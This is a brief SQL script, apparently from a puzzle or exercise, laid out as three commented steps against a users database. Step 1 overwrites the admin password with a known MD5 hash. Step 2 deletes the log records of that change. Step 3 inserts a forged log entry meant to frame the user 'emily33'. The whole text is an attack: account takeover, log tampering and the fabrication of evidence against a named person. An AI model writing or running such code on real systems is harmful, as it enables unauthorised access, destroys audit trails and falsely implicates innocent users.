-- STEP 1: change admin password to MD5 of "oops!"
UPDATE users
SET password = '982c0381c279d139fd221fce974916e7'
WHERE username = 'admin';

-- STEP 2: remove logs of admin password change
DELETE FROM user_logs
WHERE type = 'update'
AND old_username = 'admin';

-- STEP 3: insert fake log framing emily33
INSERT INTO user_logs (type, old_username, new_username, old_password, new_password)
VALUES (
    'update',
    'admin',
    'admin',
    (
        SELECT password
        FROM users
        WHERE username = 'admin'
    ),
    (
        SELECT password
        FROM users
        WHERE username = 'emily33'
    )
);
